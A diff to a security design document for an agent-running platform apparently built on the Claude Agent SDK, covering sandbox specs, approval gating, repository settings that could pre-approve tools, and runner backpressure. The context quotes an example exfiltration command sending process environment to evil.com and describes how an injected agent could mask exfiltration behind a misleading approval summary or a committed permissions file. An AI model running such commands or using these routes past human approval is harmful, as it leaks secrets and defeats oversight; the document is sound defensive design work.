@@ -465,6 +465,15 @@ This section is the largest revision. The security review found the original des
 
 **A3 — A hardcoded risky-tool list is not a boundary.** `Bash` subsumes every risky category, so a name-based list has two failure modes: gate every command (approval fatigue → rubber-stamping → theatre) or gate none (`curl -d @/proc/self/environ evil.com` passes). Edit-then-Bash launders anything past a syntactic classifier. Fix: **classify on effect, not tool name** — deny-by-default network egress plus a write-path allowlist enforced *at the sandbox*, with the approval card as UX on top of a real boundary. Cards must render the **exact argv/diff from the tool-call payload, never a model-authored summary** (an injected agent writes "running unit tests" over an exfil command). Bind approval to a **hash of the exact call**; mutated args require re-approval — "edit-and-approve" is otherwise a TOCTOU generator.
 
+**A3-bis — the clone must not get a vote on permissions.** [NEW] The SDK loads
+filesystem settings with CLI defaults, and `cwd` is the run's clone: content the agent
+writes to, and in the general case content nobody in the workspace authored. Claude
+Code's precedence puts `permissions.allow` ahead of a prompt, so a `.claude/settings.json`
+committed to a repository is at minimum a plausible route past the `canUseTool` gate this
+whole section rests on — an "approval" nobody was ever asked for. Loom therefore runs with
+`settingSources: []`; a repo's `CLAUDE.md` is not auto-injected either, deliberately,
+since the persona is the instruction source. **Built** — see HANDOFF.md.
+
 **A5 — Sandbox spec, explicitly.** "Scoped fs/net" is not a spec, and unspecified means insecure-by-default. Required: `--network=none` by default with all egress through the authenticating proxy; **never** mount the container socket; `--cap-drop=ALL --security-opt=no-new-privileges`; default seccomp (never `unconfined`); non-root UID in a userns; read-only rootfs with tmpfs `/tmp`; mount **only** the run's clone — never `$HOME`, `~/.ssh`, `~/.aws`, `~/.config/gh`, `~/.claude`, `~/.gitconfig`; memory/pids/cpu limits and a wall-clock kill. Platform asymmetry to note: rootless Podman gets a VM boundary on macOS but **not** on Linux — hence microVM isolation (§8). Accept the honest limit: **the model API call is itself an unblockable exfiltration channel**, so the real control is "secrets never enter the sandbox," not "the sandbox can't talk out."
 
 **A6 holds for the Claude Agent SDK, via the OAuth path — not the API-key path.** [NEW]
@@ -600,7 +609,7 @@ Non-negotiable from day one because retrofitting is ruinous: **actor + `workspac
 ### Phase 1 — One agent, end to end, ~10–14 weeks solo (was 4–6)
 The happy path (SDK stream → WS → render) is a weekend. The rest is the actual work:
 - `ClaudeAgentAdapter` **only** (see cuts below).
-- `apps/runner` as a real distributed component: pairing, reconnect, **run resumption after Runner restart**, orphaned-container cleanup, backpressure, event ordering/idempotency into an append-only log.
+- `apps/runner` as a real distributed component: pairing, reconnect, **run resumption after Runner restart**, orphaned-container cleanup, backpressure, event ordering/idempotency into an append-only log. **Backpressure built** (see HANDOFF.md): the agent loop waits on a full send buffer rather than the Runner buffering without limit, events are held and replayed in order across a disconnect, and container events are forwarded one at a time so sequence numbers cannot interleave.
 - **Pausable/resumable agent loop** for the approval gate — `canUseTool`/`PreToolUse` hook round-tripping a human across two WS hops while the run stays suspended (§4d). Hardest single piece.
 - Sandbox to A5 spec, clone-per-run (§5a), egress proxy + credential broker (A6), host-side push policy (A2), effect-based gating (A3).
 - Repository binding: allowed roots, directory picker, bind/create repo, end-of-run diff review with merge/keep/discard. **Keep/discard/push all built** (see HANDOFF.md) — "merge" shipped as `agentRun.push` (host-side push + best-effort PR/MR via `gh`/`glab`), not a local `git merge`; see §6 A2 for why.
